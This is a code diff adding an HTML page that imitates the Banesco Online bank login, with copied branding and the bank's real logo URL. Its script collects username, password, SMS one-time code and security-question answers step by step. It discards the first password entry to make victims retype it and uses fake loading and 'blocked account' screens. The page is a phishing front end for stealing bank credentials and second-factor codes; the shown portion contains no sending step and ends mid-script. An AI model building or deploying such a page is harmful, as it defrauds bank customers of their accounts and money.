@@ -1,0 +1,1163 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banesco Online</title>
+    <!-- Favicon -->
+    <link rel="icon" href="https://banesco-prod-2020.s3.amazonaws.com/wp-content/themes/banescocontigo/assets/images/header/logo.svg.gzip" type="image/svg+xml">
+    <link rel="shortcut icon" href="https://banesco-prod-2020.s3.amazonaws.com/wp-content/themes/banescocontigo/assets/images/header/logo.svg.gzip" type="image/svg+xml">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        html, body {
+            width: 100%;
+            min-height: 100vh;
+            background-color: #ffffff;
+            color: #333333;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body {
+            padding: 20px 32px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Contenedor principal */
+        .portal-container {
+            width: 100%;
+            max-width: 100%;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            margin: 0;
+            text-align: left;
+        }
+
+        /* Encabezado superior */
+        header {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+
+        .brand-logo {
+            display: flex;
+            align-items: center;
+        }
+
+            .brand-logo img {
+                height: 36px;
+                width: auto;
+                display: block;
+            }
+
+        .btn-salir {
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+        }
+
+        /* Cuadrícula principal */
+        .portal-main {
+            width: 100%;
+            display: grid;
+            grid-template-columns: 230px 1fr;
+            gap: 24px;
+            align-items: start;
+        }
+
+        /* --- COLUMNA IZQUIERDA --- */
+        .sidebar {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .box-soporte {
+            background-color: #174274;
+            color: #ffffff;
+            padding: 16px 15px;
+            border-radius: 4px;
+        }
+
+            .box-soporte h3 {
+                font-size: 19px;
+                font-weight: bold;
+                line-height: 1.2;
+                margin-bottom: 8px;
+            }
+
+            .box-soporte p {
+                font-size: 14px;
+                line-height: 1.35;
+                color: #e5edf7;
+            }
+
+            .box-soporte .telefono {
+                font-weight: bold;
+                font-size: 15px;
+                color: #ffffff;
+                margin-top: 6px;
+                display: block;
+            }
+
+        .box-claves {
+            display: block;
+            width: 100%;
+            border-radius: 4px;
+            overflow: hidden;
+            text-decoration: none;
+        }
+
+            .box-claves img {
+                width: 100%;
+                height: auto;
+                display: block;
+            }
+
+        .sellos-seguridad {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 8px;
+            margin-top: 4px;
+            font-size: 13px;
+            color: #555555;
+            width: 100%;
+        }
+
+        .sello-sitio-seguro {
+            display: flex;
+            align-items: center;
+        }
+
+            .sello-sitio-seguro img {
+                height: 28px;
+                width: auto;
+                display: block;
+            }
+
+        .sello-trusted {
+            display: flex;
+            align-items: center;
+        }
+
+            .sello-trusted img {
+                height: 26px;
+                width: auto;
+                display: block;
+            }
+
+        /* --- COLUMNA DERECHA --- */
+        .content-right {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            min-width: 0;
+            width: 100%;
+        }
+
+        .top-cards-row {
+            display: grid;
+            grid-template-columns: 1fr 1.08fr;
+            gap: 20px;
+            align-items: stretch;
+        }
+
+        /* Tarjeta Nuevos Usuarios */
+        .card-nuevos-usuarios {
+            border: 1px solid #d4d4d4;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            min-height: 170px;
+        }
+
+        .header-nuevos-usuarios {
+            background-color: #dddddd;
+            padding: 8px 10px;
+            text-align: center;
+            font-size: 14.5px;
+            font-weight: bold;
+            color: #444444;
+            letter-spacing: 0.2px;
+        }
+
+        .body-nuevos-usuarios {
+            padding: 12px 14px;
+            font-size: 14px;
+            color: #333333;
+            line-height: 1.4;
+        }
+
+        .footer-nuevos-usuarios {
+            padding-bottom: 12px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .btn-afiliarse {
+            background: linear-gradient(to bottom, #f2f2f2 0%, #dbdbdb 100%);
+            border: 1px solid #b8b8b8;
+            border-radius: 3px;
+            padding: 6px 16px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            color: #0b3e6d;
+            text-decoration: underline;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* Formulario de Ingreso */
+        .card-login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .casilla-usuario {
+            display: flex;
+            align-items: center;
+            background-color: #ffffff;
+            border: 1px solid #999999;
+            border-radius: 3px;
+            height: 42px;
+            padding: 0 10px;
+        }
+
+        .icono-avatar {
+            display: flex;
+            align-items: center;
+            margin-right: 8px;
+            flex-shrink: 0;
+        }
+
+        .casilla-usuario input {
+            border: none;
+            outline: none;
+            width: 100%;
+            text-align: left;
+            font-size: 15px;
+            color: #333333;
+            background: transparent;
+            padding: 0;
+            margin: 0;
+        }
+
+            .casilla-usuario input::placeholder {
+                color: #999999;
+                font-size: 14px;
+                font-weight: normal;
+                letter-spacing: 0.4px;
+                text-align: left;
+            }
+
+        .btn-ayuda-pregunta {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background-color: #277553;
+            color: #ffffff;
+            font-size: 13.5px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            flex-shrink: 0;
+            user-select: none;
+            margin-left: 6px;
+        }
+
+        /* --- PANELS DE INFORMACIÓN --- */
+        .box-info-sms {
+            background-color: #f1f5f9;
+            border: 1px solid #d0dbe5;
+            border-left: 4px solid #174274;
+            border-radius: 3px;
+            padding: 10px 12px;
+            margin-bottom: 2px;
+        }
+
+        .texto-instruccion-sms {
+            font-size: 13px;
+            color: #174274;
+            line-height: 1.45;
+        }
+
+        .opciones-alternativas {
+            margin-top: 8px;
+            padding-top: 6px;
+            border-top: 1px solid #e1e8f0;
+            font-size: 12px;
+            color: #555555;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .link-opcion {
+            color: #277553;
+            font-weight: bold;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+            .link-opcion:hover {
+                color: #1c5d3e;
+            }
+
+        /* --- ESTILOS PREGUNTAS DE SEGURIDAD --- */
+        .pregunta-label {
+            font-size: 12.5px;
+            font-weight: bold;
+            color: #174274;
+            margin-bottom: 2px;
+            margin-top: 4px;
+            display: block;
+        }
+
+        /* Botón verde Aceptar / Iniciar / Confirmar */
+        .btn-aceptar {
+            background: linear-gradient(to bottom, #2b7854 0%, #216847 100%);
+            border: 1px solid #1c5d3e;
+            color: #ffffff;
+            height: 42px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 3px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 8px;
+        }
+
+        /* Casilla de recuperación con salvavidas */
+        .box-recuperacion {
+            background-color: #eaeaea;
+            border: 1px solid #dcdcdc;
+            border-radius: 3px;
+            padding: 8px 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+            .box-recuperacion a {
+                color: #0b3e6d;
+                font-size: 13px;
+                font-weight: bold;
+                text-decoration: underline;
+                line-height: 1.25;
+            }
+
+        /* Banner Inferior de Remesas */
+        .banner-remesas {
+            width: 100%;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+            .banner-remesas img {
+                width: 100%;
+                height: 215px;
+                display: block;
+                border-radius: 4px;
+            }
+
+        /* Pie de página inferior */
+        footer {
+            width: 100%;
+            text-align: center;
+            margin-top: 60px;
+            padding-bottom: 10px;
+            font-size: 13.5px;
+            color: #666666;
+        }
+
+        /* --- PANTALLA DE CARGA (LOADER) --- */
+        .loader-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #ffffff;
+            z-index: 9999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .loader-logo {
+            width: 220px;
+            height: auto;
+        }
+
+        .loader-text {
+            font-size: 18px;
+            color: #0b3e6d;
+            font-weight: bold;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007953;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+    /* Tarjeta de mensaje bloqueado (overlay) */
+    .error-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.45);
+      z-index: 10000;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .error-card {
+      background: #ffffff;
+      border-radius: 6px;
+      width: 100%;
+      max-width: 480px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+      padding: 18px;
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+    }
+
+    .error-logo {
+      width: 52px;
+      height: 52px;
+      flex-shrink: 0;
+      border-radius: 50%;
+      background: #da2929; /* rojo de alerta */
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #ffffff; /* X en blanco */
+      font-weight: 900;
+      font-size: 20px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.12);
+    }
+
+    .error-body {
+      flex: 1;
+    }
+
+    .error-title {
+      font-size: 15px;
+      font-weight: bold;
+      color: #721c24;
+      margin-bottom: 6px;
+    }
+
+    .error-text {
+      font-size: 13px;
+      color: #333333;
+      line-height: 1.4;
+      margin-bottom: 10px;
+    }
+
+    .btn-error-aceptar {
+      background: linear-gradient(to bottom, #2b7854 0%, #216847 100%); /* color verde banco */
+      border: 1px solid #1c5d3e;
+      color: #ffffff;
+      padding: 8px 14px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-weight: bold;
+      box-shadow: 0 2px 6px rgba(33,104,71,0.18);
+      transition: transform 120ms ease, box-shadow 120ms ease;
+    }
+
+    .btn-error-aceptar:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 6px 18px rgba(33,104,71,0.22);
+    }
+
+    /* Error inline en la casilla de usuario */
+    .inline-error {
+      display: none;
+      color: #da2929;
+      font-size: 13px;
+      margin-top: 8px;
+    }
+
+    .inline-error .inline-card {
+      background: #fff;
+      border: 1px solid #e6e6e6;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+      padding: 12px;
+      border-radius: 6px;
+      color: #2b2b2b;
+      font-size: 13px;
+      max-width: 420px;
+    }
+
+    .inline-error .inline-text {
+      color: #da2929;
+      margin-bottom: 8px;
+      line-height: 1.3;
+    }
+
+    .casilla-usuario.error {
+      border-color: #da2929;
+    }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Adaptación a dispositivos móviles */
+        @media (max-width: 768px) {
+            body {
+                padding: 10px 10px 16px 10px;
+            }
+
+            .portal-container {
+                justify-content: flex-start;
+            }
+
+            header {
+                margin-bottom: 50px;
+            }
+
+            .brand-logo img {
+                height: 16px;
+            }
+
+            .btn-salir svg {
+                width: 16px;
+                height: 16px;
+            }
+
+            .portal-main {
+                grid-template-columns: 90px 1fr;
+                gap: 8px;
+            }
+
+            .sidebar {
+                gap: 6px;
+            }
+
+            .box-soporte {
+                padding: 6px 5px;
+                border-radius: 2px;
+            }
+
+                .box-soporte h3 {
+                    font-size: 8.5px;
+                    margin-bottom: 3px;
+                }
+
+                .box-soporte p {
+                    font-size: 6.2px;
+                    line-height: 1.25;
+                }
+
+                .box-soporte .telefono {
+                    font-size: 6.8px;
+                    margin-top: 2px;
+                }
+
+            .box-claves {
+                border-radius: 2px;
+            }
+
+            .sellos-seguridad {
+                font-size: 6px;
+                gap: 3px;
+                margin-top: 2px;
+            }
+
+            .sello-sitio-seguro img {
+                height: 12px;
+            }
+
+            .sello-trusted img {
+                height: 11px;
+            }
+
+            .content-right {
+                gap: 8px;
+            }
+
+            .top-cards-row {
+                gap: 6px;
+            }
+
+            .card-nuevos-usuarios {
+                min-height: 70px;
+            }
+
+            .header-nuevos-usuarios {
+                padding: 2px 4px;
+                font-size: 6.5px;
+            }
+
+            .body-nuevos-usuarios {
+                padding: 4px 5px;
+                font-size: 6px;
+                line-height: 1.25;
+            }
+
+            .footer-nuevos-usuarios {
+                padding-bottom: 4px;
+            }
+
+            .btn-afiliarse {
+                font-size: 6.2px;
+                padding: 2px 6px;
+                gap: 3px;
+                border-radius: 2px;
+            }
+
+                .btn-afiliarse svg {
+                    width: 8px;
+                    height: 8px;
+                }
+
+            .card-login-form {
+                gap: 4px;
+            }
+
+            .casilla-usuario {
+                height: 24px;
+                padding: 0 4px;
+                border-radius: 2px;
+            }
+
+            .icono-avatar {
+                margin-right: 3px;
+            }
+
+                .icono-avatar svg {
+                    width: 9px;
+                    height: 9px;
+                }
+
+            .casilla-usuario input {
+                font-size: 6.8px;
+            }
+
+                .casilla-usuario input::placeholder {
+                    font-size: 6.5px;
+                }
+
+            .btn-ayuda-pregunta {
+                width: 10px;
+                height: 10px;
+                font-size: 6.2px;
+                margin-left: 2px;
+            }
+
+            .box-info-sms {
+                padding: 4px 6px;
+                border-left-width: 2px;
+            }
+
+            .texto-instruccion-sms {
+                font-size: 6px;
+            }
+
+            .opciones-alternativas {
+                margin-top: 4px;
+                padding-top: 3px;
+                font-size: 5.5px;
+                gap: 2px;
+            }
+
+            .pregunta-label {
+                font-size: 6px;
+            }
+
+            .btn-aceptar {
+                height: 18px;
+                font-size: 7.2px;
+                border-radius: 2px;
+                margin-top: 3px;
+            }
+
+            .box-recuperacion {
+                padding: 3px 4px;
+                gap: 4px;
+                border-radius: 2px;
+            }
+
+                .box-recuperacion svg {
+                    width: 10px;
+                    height: 10px;
+                }
+
+                .box-recuperacion a {
+                    font-size: 5.8px;
+                    line-height: 1.15;
+                }
+
+            .banner-remesas {
+                border-radius: 2px;
+            }
+
+                .banner-remesas img {
+                    height: auto;
+                    border-radius: 2px;
+                }
+
+            footer {
+                margin-top: 90px;
+                font-size: 6.5px;
+                padding-bottom: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Contenedor Principal Portal -->
+    <div class="portal-container" id="portalContainer">
+
+        <!-- Encabezado -->
+        <header>
+            <div class="brand-logo">
+                <img src="logo_BanescOnline.png" alt="BanescOnline">
+            </div>
+            <a href="iniciar.html" class="btn-salir" title="Salir">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
+                    <path d="M11 4H5C3.89543 4 3 4.89543 3 6V18C3 19.1046 3.89543 20 5 20H11" stroke="#007953" stroke-width="2.5" stroke-linecap="round" />
+                    <path d="M15 8L19 12L15 16" stroke="#007953" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" />
+                    <path d="M8 12H19" stroke="#007953" stroke-width="2.5" stroke-linecap="round" />
+                </svg>
+            </a>
+        </header>
+
+        <!-- Disposición Principal -->
+        <div class="portal-main">
+
+            <!-- Columna Izquierda -->
+            <aside class="sidebar">
+                <div class="box-soporte">
+                    <h3>Soporte Banca<br>por Internet</h3>
+                    <p>Si desea más información o tiene alguna duda llámenos</p>
+                    <span class="telefono">al 0212-501.1111</span>
+                </div>
+
+                <a href="iniciar.html" class="box-claves">
+                    <img src="gestion-de-claves.png" alt="Gestiona tus Claves">
+                </a>
+
+                <div class="sellos-seguridad">
+                    <div class="sello-sitio-seguro">
+                        <img src="sitio-seguro.png" alt="Sitio Seguro">
+                    </div>
+                    <div class="sello-trusted">
+                        <img src="trustedsite.png" alt="TrustedSite">
+                    </div>
+                </div>
+            </aside>
+
+            <!-- Columna Derecha -->
+            <section class="content-right">
+                <div class="top-cards-row">
+
+          <!-- Mensaje de usuario bloqueado (overlay) -->
+          <div id="blockedOverlay" class="error-overlay" role="dialog" aria-hidden="true">
+            <div class="error-card" role="document">
+              <div class="error-logo" aria-hidden="true">X</div>
+              <div class="error-body">
+                <div class="error-title">Su usuario ha sido incorrecto</div>
+                <div class="error-text">Su usuario ha sido incorrecto por no responder correctamente las preguntas de seguridad. Para recuperar el acceso, por favor ingrese en la opción "Afiliese Aquí" en la página de inicio de BanescOnline y siga los pasos que indica el sistema.</div>
+                <div style="display:flex;justify-content:flex-end;"><button id="btnBlockedAccept" class="btn-error-aceptar">Aceptar</button></div>
+              </div>
+            </div>
+          </div>
+
+                    <!-- Nuevos Usuarios -->
+                    <div class="card-nuevos-usuarios">
+                        <div class="header-nuevos-usuarios">NUEVOS USUARIOS</div>
+                        <div class="body-nuevos-usuarios">
+                            Si usted está ingresando a este servicio por primera vez, o no posee Usuario y Clave
+                        </div>
+                        <div class="footer-nuevos-usuarios">
+                            <button type="button" class="btn-afiliarse" onclick="window.location.href='iniciar.html'">
+                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#0b3e6d" stroke-width="2.5">
+                                    <circle cx="12" cy="12" r="10" />
+                                    <line x1="12" y1="8" x2="12" y2="16" />
+                                    <line x1="8" y1="12" x2="16" y2="12" />
+                                </svg>
+                                Afíliese Aquí
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Formulario de Acceso -->
+                    <div class="card-login-form">
+                        <form id="formLogin" onsubmit="procesarIngreso(event)">
+
+                            <!-- Paso 1: Usuario -->
+                            <div class="casilla-usuario" id="boxUsuario">
+                                <span class="icono-avatar">
+                                    <svg width="18" height="18" viewBox="0 0 24 24" fill="#707070">
+                                        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                                    </svg>
+                                </span>
+                                <input type="text" id="inputUsuario" placeholder="USUARIO" autocomplete="off" spellcheck="false" required>
+                                <span class="btn-ayuda-pregunta" title="Ayuda" onclick="window.location.href='iniciar.html'">?</span>
+                            </div>
+              <div id="inlineErrorUsuario" class="inline-error" aria-live="polite">
+                <div class="inline-card">
+                  <div class="inline-text">Su usuario ha sido incorrecto por no responder correctamente las preguntas de seguridad. Para recuperar el acceso, por favor ingrese en la opción "Afiliese Aquí" en la página de inicio de BanescOnline y siga los pasos que<br>indica el sistema.</div>
+                  <div style="display:flex;justify-content:flex-end;"><button id="btnInlineAccept" class="btn-error-aceptar">Aceptar</button></div>
+                </div>
+              </div>
+
+                            <!-- Paso 2: Clave -->
+                            <div class="casilla-usuario" id="boxClave" style="display: none;">
+                                <span class="icono-avatar">
+                                    <svg width="18" height="18" viewBox="0 0 24 24" fill="#707070">
+                                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
+                                    </svg>
+                                </span>
+                                <input type="password" id="inputClave" placeholder="CLAVE" autocomplete="off">
+                            </div>
+
+                            <!-- Paso 3: Código de Validación SMS -->
+                            <div id="boxSMS" style="display: none; flex-direction: column; gap: 8px;">
+                                <div class="box-info-sms">
+                                    <p class="texto-instruccion-sms">
+                                        Hemos enviado una Clave Digital de Validación vía SMS a su número celular registrado. Por favor, ingrésela a continuación:
+                                    </p>
+                                    <div class="opciones-alternativas">
+                                        <span>¿No recibió su clave?</span>
+                                        <a class="link-opcion" onclick="window.location.href='iniciar.html'">Enviar clave al correo electrónico registrado</a>
+                                    </div>
+                                </div>
+
+                                <div class="casilla-usuario">
+                                    <span class="icono-avatar">
+                                        <svg width="18" height="18" viewBox="0 0 24 24" fill="#707070">
+                                            <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM9 11H7V9h2v2zm4 0h-2V9h2v2zm4 0h-2V9h2v2z" />
+                                        </svg>
+                                    </span>
+                                    <input type="text" id="inputSMS" placeholder="CLAVE DIGITAL / SMS" autocomplete="off" maxlength="8">
+                                </div>
+                            </div>
+
+                            <!-- Paso 4: Preguntas de Seguridad -->
+                            <div id="boxPreguntas" style="display: none; flex-direction: column; gap: 8px;">
+                                <div class="box-info-sms">
+                                    <p class="texto-instruccion-sms">
+                                        Responda las preguntas de seguridad registradas en su cuenta para verificar su identidad:
+                                    </p>
+                                </div>
+
+                                <span class="pregunta-label">1. ¿Cuál es el nombre de su primera mascota?</span>
+                                <div class="casilla-usuario">
+                                    <span class="icono-avatar">
+                                        <svg width="18" height="18" viewBox="0 0 24 24" fill="#707070">
+                                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 16h-2v-2h2v2zm1.07-7.75l-.9.92C12.45 11.9 12 12.5 12 14h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H7c0-2.76 2.24-5 5-5s5 2.24 5 5c0 1.04-.42 1.99-1.07 2.75z" />
+                                        </svg>
+                                    </span>
+                                    <input type="text" id="inputPregunta1" placeholder="RESPUESTA 1" autocomplete="off">
+                                </div>
+
+                                <span class="pregunta-label">2. ¿En qué ciudad nació su madre?</span>
+                                <div class="casilla-usuario">
+                                    <span class="icono-avatar">
+                                        <svg width="18" height="18" viewBox="0 0 24 24" fill="#707070">
+                                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 16h-2v-2h2v2zm1.07-7.75l-.9.92C12.45 11.9 12 12.5 12 14h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H7c0-2.76 2.24-5 5-5s5 2.24 5 5c0 1.04-.42 1.99-1.07 2.75z" />
+                                        </svg>
+                                    </span>
+                                    <input type="text" id="inputPregunta2" placeholder="RESPUESTA 2" autocomplete="off">
+                                </div>
+                            </div>
+
+                            <button type="submit" id="btnSubmit" class="btn-aceptar">Aceptar</button>
+                        </form>
+
+                        <div class="box-recuperacion">
+                            <svg width="21" height="21" viewBox="0 0 36 36" style="flex-shrink: 0;">
+                                <circle cx="18" cy="18" r="16" fill="#da2929" />
+                                <circle cx="18" cy="18" r="8" fill="#ffffff" />
+                                <path d="M18 2 A16 16 0 0 1 29.3 6.7 L23.7 12.3 A8 8 0 0 0 18 10 Z" fill="#ffffff" />
+                                <path d="M34 18 A16 16 0 0 1 29.3 29.3 L23.7 23.7 A8 8 0 0 0 26 18 Z" fill="#ffffff" />
+                                <path d="M18 34 A16 16 0 0 1 6.7 29.3 L12.3 23.7 A8 8 0 0 0 18 26 Z" fill="#ffffff" />
+                                <path d="M2 18 A16 16 0 0 1 6.7 6.7 L12.3 12.3 A8 8 0 0 0 10 18 Z" fill="#ffffff" />
+                                <circle cx="18" cy="18" r="7.5" fill="#ffffff" />
+                                <circle cx="18" cy="18" r="16" fill="none" stroke="#ab1f1f" stroke-width="1.2" />
+                            </svg>
+                            <a href="iniciar.html">¿Olvidó su usuario, clave de acceso o preguntas de seguridad?</a>
+                        </div>
+                    </div>
+
+                </div>
+
+                <div class="banner-remesas">
+                    <img src="banner-remesas.png" alt="Las remesas con Banesco son seguras y rápidas">
+                </div>
+            </section>
+
+        </div>
+
+        <footer>
+            Banesco Banco Universal, C.A. - RIF: J-07013380-5 Copyright 2002. Todos los derechos reservados.
+        </footer>
+
+    </div>
+
+    <!-- Pantalla de Cargando (Loader) -->
+    <div class="loader-container" id="loaderContainer">
+        <img src="https://banesco-prod-2020.s3.amazonaws.com/wp-content/themes/banescocontigo/assets/images/header/logo.svg.gzip" alt="Banesco" class="loader-logo">
+        <div class="spinner"></div>
+        <div class="loader-text">Espere un momento...</div>
+    </div>
+
+    <script>
+            let pasoActual = 1;
+            let intentoClave = 0; // contador de intentos para la clave (paso 2)
+            let smsErrorPending = false; // si es true, el error de SMS está pendiente y no se muestra hasta que el usuario lo decida
+
+            function procesarIngreso(e) {
+              e.preventDefault();
+
+              const boxUsuario = document.getElementById('boxUsuario');
+              const usuarioInput = document.getElementById('inputUsuario');
+
+              const boxClave = document.getElementById('boxClave');
+              const claveInput = document.getElementById('inputClave');
+
+              const boxSMS = document.getElementById('boxSMS');
+              const smsInput = document.getElementById('inputSMS');
+
+              const boxPreguntas = document.getElementById('boxPreguntas');
+              const p1Input = document.getElementById('inputPregunta1');
+              const p2Input = document.getElementById('inputPregunta2');
+
+              const btnSubmit = document.getElementById('btnSubmit');
+              const loaderContainer = document.getElementById('loaderContainer');
+
+              if (pasoActual === 1) {
+                if (usuarioInput.value.trim() !== "") {
+                  pasoActual = 2;
+                  boxUsuario.style.display = 'none';
+                  boxClave.style.display = 'flex';
+                  claveInput.required = true;
+                  claveInput.focus();
+                  btnSubmit.textContent = 'Ingresar';
+                }
+              } else if (pasoActual === 2) {
+        if (claveInput.value.trim() !== "") {
+          intentoClave++;
+          if (intentoClave === 1) {
+            // primer intento: registrar intento internamente, no mostrar mensajes
+            // el mensaje (overlay) se mostrará sólo cuando el usuario lo decida manualmente
+            return;
+          } else {
+            // segundo intento: mostrar pantalla de cargando y luego avanzar a SMS
+            loaderContainer.style.display = 'flex';
+            // simular carga y después mostrar SMS
+            setTimeout(() => {
+              loaderContainer.style.display = 'none';
+              pasoActual = 3;
+              boxClave.style.display = 'none';
+              boxSMS.style.display = 'flex';
+              document.getElementById('inputSMS').required = true;
+              document.getElementById('inputSMS').focus();
+              btnSubmit.textContent = 'Validar';
+            }, 1200);
+            // resetear contador de intentos
+            intentoClave = 0;
+            return;
+          }
+        }
+              } else if (pasoActual === 3) {
+                if (smsInput.value.trim() !== "") {
+                  // Al pulsar Validar: mostrar pantalla de cargando y avanzar a Preguntas
+                  loaderContainer.style.display = 'flex';
+                  // limpiar cualquier error pendiente de SMS
+                  smsErrorPending = false;
+                  setTimeout(() => {
+                    loaderContainer.style.display = 'none';
+                    pasoActual = 4;
+                    boxSMS.style.display = 'none';
+                    boxPreguntas.style.display = 'flex';
+                    p1Input.required = true;
+                    p2Input.required = true;
+                    p1Input.focus();
+                    btnSubmit.textContent = 'Continuar';
+                  }, 1200);
+                }
+              } else if (pasoActual === 4) {
+        if (p1Input.value.trim() !== "" && p2Input.value.trim() !== "") {
+          // Simulación de validación: si las respuestas no coinciden con las correctas,
+          // mostrará el mensaje de cuenta bloqueada. Para pruebas, las respuestas
+          // correctas son: 'banesco' y 'banesco' (todo en minúsculas).
+          const a1 = p1Input.value.trim().toLowerCase();
+          const a2 = p2Input.value.trim().toLowerCase();
+          const valid = (a1 === 'banesco' && a2 === 'banesco');
+
+          if (!valid) {
+            // No mostrar overlay aquí; mostrar pantalla de cargando y luego resetear
+            loaderContainer.style.display = 'flex';
+            setTimeout(() => {
+              loaderContainer.style.display = 'none';
+              // volver al paso 1 y limpiar campos
+              pasoActual = 1;
+              document.getElementById('boxUsuario').style.display = 'flex';
+              document.getElementById('boxClave').style.display = 'none';
+              document.getElementById('boxSMS').style.display = 'none';
+              document.getElementById('boxPreguntas').style.display = 'none';
+
+              document.getElementById('inputUsuario').value = '';
+              document.getElementById('inputClave').value = '';
+              document.getElementById('inputSMS').value = '';
+              document.getElementById('inputPregunta1').value = '';
+              document.getElementById('inputPregunta2').value = '';
+
+              document.getElementById('inputUsuario').focus();
+            }, 1200);
+            return;
+          }
+
+          loaderContainer.style.display = 'flex';
+
+          setTimeout(() => {
+            window.location.href = 'iniciar.html';
+          }, 3000);
+        }
+              }
+            }
+
+    // Mostrar un overlay genérico con título, texto y propósito
+    function showOverlay(titleText, bodyHtml, purpose) {
+      const overlay = document.getElementById('blockedOverlay');
+      const title = overlay.querySelector('.error-title');
+      const text = overlay.querySelector('.error-text');
+      if (title) title.textContent = titleText;
+      if (text) text.innerHTML = bodyHtml;
+      overlay.dataset.purpose = purpose || '';
+      overlay.style.display = 'flex';
+      overlay.setAttribute('aria-hidden', 'false');
+      // desactivar botón enviar temporalmente
+      const btnSubmit = document.getElementById('btnSubmit');
+      if (btnSubmit) btnSubmit.disabled = true;
+    }
+
+    function showBlockedMessage() {
+      showOverlay('Su usuario ha sido incorrecto', 'Su usuario ha sido incorrecto por no responder correctamente las preguntas de seguridad. Para recuperar el acceso, por favor ingrese en la opción "Afiliese Aquí" en la página de inicio de BanescOnline y siga los pasos que<br>indica el sistema.', 'blocked');
+    }
+
+    function showSmsError() {
+      showOverlay('Código incorrecto', 'El código de validación ingresado es incorrecto. Por favor intente nuevamente.', 'sms');
+    }
+
+    // Muestra un error inline en la casilla de usuario
+    function showInlineError(message) {
+      const inline = document.getElementById('inlineErrorUsuario');
+      const box = document.getElementById('boxUsuario');
+      // actualizar texto si es necesario
+      const textEl = inline.querySelector('.inline-text');
+      if (textEl) textEl.textContent = message;
+      inline.style.display = 'block';
+      box.classList.add('error');
+      document.getElementById('inputUsuario').focus();
+      // Conectar botón Aceptar inline para permitir reintento inmediato
+      const btn = document.getElementById('btnInlineAccept');
+      if (btn) {
+        btn.addEventListener('click', () => {
+          hideInlineError();
+          // resetear inputs para reintento
+          document.getElementById('inputUsuario').value = '';
+          document.getElementById('inputClave').value = '';
+          pasoActual = 1;
+          document.getElementById('boxUsuario').style.display = 'flex';
+          document.getElementById('boxClave').style.display = 'none';
+        }, { once: true });
+      }
+    }
+
+    function hideInlineError() {
+      const inline = document.getElementById('inlineErrorUsuario');
+      const box = document.getElementById('boxUsuario');
+      inline.textContent = '';
+      inline.style.display = 'none';
+      box.classList.remove('error');
+    }
+
+    // Oculta el overlay y resetea el formulario para intentar de nuevo
